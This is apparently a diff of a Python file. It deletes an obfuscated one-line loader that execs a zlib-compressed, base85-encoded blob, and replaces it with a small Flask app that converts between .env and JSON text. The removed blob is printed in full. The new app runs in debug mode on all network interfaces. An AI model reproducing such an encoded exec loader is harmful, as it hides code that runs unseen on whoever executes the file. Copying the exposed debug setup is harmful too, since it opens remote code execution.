@@ -1,2 +1,50 @@
 #!venv/bin/python3
-import zlib, base64;exec(zlib.decompress(base64.b85decode('c$~FY?{3>R5dZF{;8YZn7e{UWY#%xpgV%b+hBRH94nq+K0xi)o8;R6N%9)eqUG}kl4!_v$NXe!hr*SgWfD($lJKp_%$2*D_rBsGU-QsTacg3{fQcyK*rpoDvpXbap@1L|3t&x%iNo6h-Ehwp1ewB)K$cdTetkrq~uOdZTq?DB+bTs1Wm?@G|B4jmTdCtg?3c=@J6mz!bGuF!3h-6%sIh`iB%v5C9Kc@YnMc`+}l2m4lbV)dPesFNQ_tVp?2<@t3nwiAPES8_wYj#${^y$G~haBv~a{$jFJU_tm<5|m!Jt4hMvNGUj#xxm9l~rKXF5wGPiIF8(33dXqLxSCad{3gB3FjnC?c*O<^;L$_7{F^=Eu2hpE-=R6GeH%cLJ9IY*yN|47DJiCAe+xp;KcBe^VuylK0g}_k|cq@fxo!)ZZLR8;8|?(QVMNU#epASZ9$d`&2ocUf&aeK^*MT4!+!ew47~RMgir=z8^t|T^rAov*3jD}hwXJCKNGgzYyYf9+JXN_D+iv(HMI9Sy^wp<j)xw&n=CmxOT~qWoTc{H&L^`NFv0|EQ01(GV?$NC%fxQVS-x^Y73E?mFB8=8&uKHiJat$c;`jYm9a|>ikNu;gw|~_yuiy9k$MyK-$6ho1<>=3TJ$%!9-9P@&JKJ!~Yr`k~4=X#{6SK(95s2~*Nyila3ka<$7#tJk`+Q3q;9ia6lmqC<;p%i7@ki6Q9Y7Nv5lbF?sSRwL&u3yjQ$R;02ol3#7&9>;^M6T6mEmykLvPJd_WQ}(W6RGu6E?mCRFV<TS;R$I89VF{C>+g89XpC;)KEa|`o_*&ax*5fgkXKmP=#$mHNm$fYMwTBhd7rsi>&oEQ{Kj4>vEGVWa@%VJ7hxhiaD~J^_Ux0=*VNs%7b=%sbDP{h1Z~Y)4jH;Hv<v2J;Z|}wu&Sr^O>2?8mwVNCoCnpO4Iol9S7UevV{IFa&Ws<S`emh&kJH{OBokyEBNCh5_UseLz&ez{CO;Ntw;>bfR|A_hO^I21j-$<*S@9K_<RZm&Op_gcz7b%Ov<XFj2eR-;^eu=m@wV_yV$i<Jdj;5lJb(~?gCQ4>1+~h?J^Q((qQ%gm1H<2MvZBDA!L(lb?1Bo6$bo-{!C$mk)17IE=k9drwFKb(~33AS!$w1=)pU{T+3=qA+4`=C$a)?D74|9gU&+8S<>Cp;Ps=5MbIIeHMh%WRPXW3nt4}o1EB`4Jhx-2FQT^VI*?>5ad+?7^nQ1jnXyd#H5_dh3i`q*c7=URKqt(qwZO6vk_WGvFM`I?#;})_53_8&&yX|leuLq~VEel4;A8o=0B*_J|3}fq`VBy|zCQ@W`>W_zP_)Urgk#L|GAWqW^xWRNU%6u*VYqDqLHJ;2_`xFJyQspuHq?*G@SJNXGPX@<Bh!oeYCfTg)1kea17;JhB$N^G#l+<0%5urzqevJu3_EkD%>~r(!tMdLd?qwU*$%LsqYj{J#nOB}!wq_W{08CMsX`i!ewI{g0EHRA6|6%k)|edx)oBTZJgu!;&zq?1J<z_}PrHS~2GQj?u_dWws(={>#)R37!?a*XuJhYv3kX?qn;wehQ$P5aoN#9oiu4r(LMt$%7uf?5i*O7vVm-u=Fvk_c`>MUOV!$8|B~zhYhAr(J`W|2buIVZ_?!z;aX@#NKkmF!M{>JO9pAlYhulr4}f*mIkLjDeW2_#sO2wJct!R!i?1bax5gf7EeL-`N4YY=4')).decode())
+from flask import Flask, render_template, request
+import json
+from colorama import Fore, Style
+
+app = Flask(__name__)
+
+# Fonction pour afficher le texte en couleurs arc-en-ciel
+def display_rainbow_text(text):
+    rainbow_colors = [Fore.RED, Fore.YELLOW, Fore.GREEN, Fore.CYAN, Fore.BLUE, Fore.MAGENTA]
+    reset_color = Fore.RESET
+    rainbow_text = ""
+    for i, char in enumerate(text):
+        rainbow_text += rainbow_colors[i % len(rainbow_colors)] + char
+    rainbow_text += reset_color
+    return rainbow_text
+
+# Fonction pour générer un fichier .env à partir d'un texte JSON
+def generate_env_from_json(json_text):
+    env_data = json.loads(json_text)
+    env_lines = [f'{key}={value}' for key, value in env_data.items()]
+    return '\n'.join(env_lines)
+
+# Fonction pour générer un texte JSON à partir d'un fichier .env
+def generate_json_from_env(env_text):
+    env_lines = env_text.strip().split('\n')
+    env_data = {}
+    for line in env_lines:
+        key, value = line.split('=', 1)
+        env_data[key] = value
+    return json.dumps(env_data, indent=2)
+
+@app.route('/', methods=['GET', 'POST'])
+def main():
+    if request.method == 'POST':
+        input_text = request.form['inputText']
+        action = request.form['action']
+        result = ""
+
+        if action == 'generate_env':
+            result = generate_env_from_json(input_text)
+        elif action == 'generate_json':
+            result = generate_json_from_env(input_text)
+
+        return render_template('index.html', result=result, input_text=input_text)
+
+    return render_template('index.html')
+
+if __name__ == '__main__':
+    app.run(host='0.0.0.0', debug=True)
